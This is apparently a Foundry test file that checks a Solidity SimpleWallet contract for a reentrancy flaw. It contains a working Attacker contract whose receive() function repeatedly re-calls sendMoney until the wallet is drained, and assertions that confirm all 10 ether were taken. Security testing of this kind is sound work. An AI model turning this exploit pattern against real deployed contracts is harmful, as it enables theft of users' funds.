// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x610495793564aed0f9c7fc48dc4c7c9151d34fd6.sol";

contract SimpleWalletTest is Test {
    function testReentrancyAttack() public {
        // Deploy attacker who becomes wallet owner
        Attacker attacker = new Attacker();
        
        // Fund the wallet contract with 10 ether
        uint fundAmount = 10 ether;
        vm.deal(address(attacker.wallet()), fundAmount);
        
        // Verify initial balance
        assertEq(address(attacker.wallet()).balance, fundAmount, "Initial funding failed");

        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 walletBalanceBefore = address(attacker.wallet()).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console2.log("Wallet balance before attack:", walletBalanceBefore);
        console2.log("Attacker balance before attack:", attackerBalanceBefore);
        
        console2.log("--- Trigger Attack ---");
        // Start attack (1 ether per reentrant call)
        attacker.attack(1 ether);

        console2.log("--- AFTER-Trigger Attack ---");
        uint256 walletBalanceAfter = address(attacker.wallet()).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console2.log("Wallet balance after attack:", walletBalanceAfter);
        console2.log("Attacker balance after attack:", attackerBalanceAfter);

        // Verify balances post-attack
        assertEq(walletBalanceAfter, 0, "Wallet should be drained");
        assertEq(attackerBalanceAfter, fundAmount, "Attacker should have all funds");
        
        // Vulnerability verdict
        if (walletBalanceAfter == 0 && attackerBalanceAfter == fundAmount) {
            console2.log("Vulnerability Exists: Successful reentrancy attack drained wallet");
        } else {
            console2.log("Vulnerability not Exist: Failed to drain wallet via reentrancy");
        }
    }
}

contract Attacker {
    SimpleWallet public wallet;
    uint public attackAmount;

    constructor() {
        // Deploys wallet & becomes owner
        wallet = new SimpleWallet();
    }

    function attack(uint _amount) external {
        attackAmount = _amount;
        wallet.sendMoney(address(this), attackAmount, "");
    }

    receive() external payable {
        // Reenter until insufficient wallet balance
        if (address(wallet).balance >= attackAmount) {
            wallet.sendMoney(address(this), attackAmount, "");
        }
    }
}